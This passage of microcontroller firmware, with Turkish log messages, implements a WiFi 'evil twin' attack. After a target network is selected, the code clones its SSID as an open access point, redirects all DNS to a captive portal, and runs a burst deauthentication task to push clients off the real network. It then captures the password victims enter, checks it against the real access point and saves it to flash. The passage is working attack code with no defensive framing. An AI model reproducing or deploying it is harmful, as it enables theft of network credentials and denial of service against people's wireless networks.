      strncpy(target_ssid, sel_ssid.c_str(), MAX_SSID_LEN - 1);
      target_ssid[MAX_SSID_LEN - 1] = '\0';
      target_channel = 6; 
      target_enc = ENC_TYPE_CCMP;
      
      if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
      for (auto &net : networks) {
        if (net.ssid == sel_ssid) {
          target_channel = net.channel;
          target_enc = net.enc;
          memcpy(target_bssid, net.bssid, 6);
          break;
        }
      }
      if (networks_mutex) xSemaphoreGive(networks_mutex);
      
      sendSwitchingPage(client);
      pending_ap_switch = true; 
      client.flush();
      return;
    }
    sendStartPage(client); 
    client.flush();
    return;
  }

  if (request.startsWith("POST") && path == "/connect") {
    if (conn_status == CS_RUNNING) { sendPortalPage(client, false); return; }
    String sel_pass = parsePostParam(body, "pass");
    
    strncpy(pending_ssid, target_ssid, MAX_SSID_LEN - 1);
    pending_ssid[MAX_SSID_LEN - 1] = '\0';
    strncpy(pending_pass, sel_pass.c_str(), MAX_PASS_LEN - 1);
    pending_pass[MAX_PASS_LEN - 1] = '\0';
    pending_enc = target_enc;
    
    conn_result = "";
    startConnectTask();
    sendPortalPage(client, false); 
    client.flush();
    return;
  }

  sendPortalPage(client, conn_result.length() > 0);
  client.flush();
}

// ─── Setup ───────────────────────────────────────────────────────────────────
void setup() {
  Serial.begin(115200); delay(500);
  Serial.println("\n[Boot] Cihaz Aciliyor... BURST (Maksimum Hizli) Deauth Aktif!");

  networks_mutex = xSemaphoreCreateMutex();
  
  FlashMemory.begin(FLASH_OFFSET, FLASH_BUF_SIZE);
  loadCredentials();
  
  LwIP_Init();
  wifi_on(RTW_MODE_STA_AP); delay(500);

  wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK, (char *)AP_INITIAL_PASS, strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
  delay(500);

  ip4_addr_t ip, mask, gw;
  IP4_ADDR(&ip,   192, 168, 4, 1);
  IP4_ADDR(&mask, 255, 255, 255, 0);
  IP4_ADDR(&gw,   192, 168, 4, 1);
  netif_set_addr(&xnetif[1], &ip, &mask, &gw);
  netif_set_up(&xnetif[1]); netif_set_link_up(&xnetif[1]);
  
  dhcps_init(&xnetif[1]); delay(500);
  
  server.begin();
  dnsServer.setResolvedIP(192, 168, 4, 1);
  dnsServer.begin();
  
  startScan();
}

// ─── Loop ────────────────────────────────────────────────────────────────────
void loop() {
  if (pending_ap_switch) {
    pending_ap_switch = false;
    ap_switched = true;
    
    delay(1000); 
    Serial.println("\n[Switch] Dinamik Ag Gecisi Basliyor...");

    dnsServer.stop();
    delay(200);

    wifi_set_mode(RTW_MODE_STA);
    delay(1000);

    wifi_set_mode(RTW_MODE_STA_AP);
    delay(1000);

    Serial.print("[Switch] Yeni Sifresiz Ag Aciliyor: "); Serial.println(target_ssid);
    
    wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
    delay(1500);

    netif_set_up(&xnetif[1]); 
    netif_set_link_up(&xnetif[1]);
    delay(200);

    dnsServer.begin();

    Serial.println("[Switch] Islem Tamam! Baglanti Kilidi Cozuldu ve DNS Yonlendirmesi Aktif.");
    
    deauth_active = true;
    xTaskCreate(deauthTask, "deauth_tsk", 1024, NULL, tskIDLE_PRIORITY + 1, NULL);
  }

  if (scan_status == SCAN_DONE) scan_status = SCAN_IDLE;

  if (conn_status == CS_DONE_OK) {
    sta_connected = true;
    strncpy(saved_ssid, pending_ssid, MAX_SSID_LEN - 1);
    strncpy(saved_pass, pending_pass, MAX_PASS_LEN - 1);
    
    saveCredentials(saved_ssid, saved_pass);
    
    deauth_active = false;
    
    conn_result = "ok"; 
    conn_status = CS_IDLE;
    
    revert_time = millis() + 4000; 
    
  } else if (conn_status == CS_DONE_FAIL) {
    sta_connected = false; conn_result = "fail"; conn_status = CS_IDLE;
  }

  if (revert_time > 0 && millis() > revert_time) {
    revert_time = 0;
    Serial.println("\n[Revert] Sifre dogrulandi, X agina donmek icin yeniden baslatiliyor...");
    Serial.flush(); 
    delay(200);     
    sys_reset();    
  }

  if (conn_status == CS_IDLE && scan_status == SCAN_IDLE && !ap_switched && (millis() - last_scan_ms > RESCAN_INTERVAL_MS)) {
    startScan();
  }

  WiFiClient client = server.available();
  if (client) { 
    handleClient(client); 
    client.flush();
    delay(50); 
    client.stop(); 
  }
  
  delay(2); 
}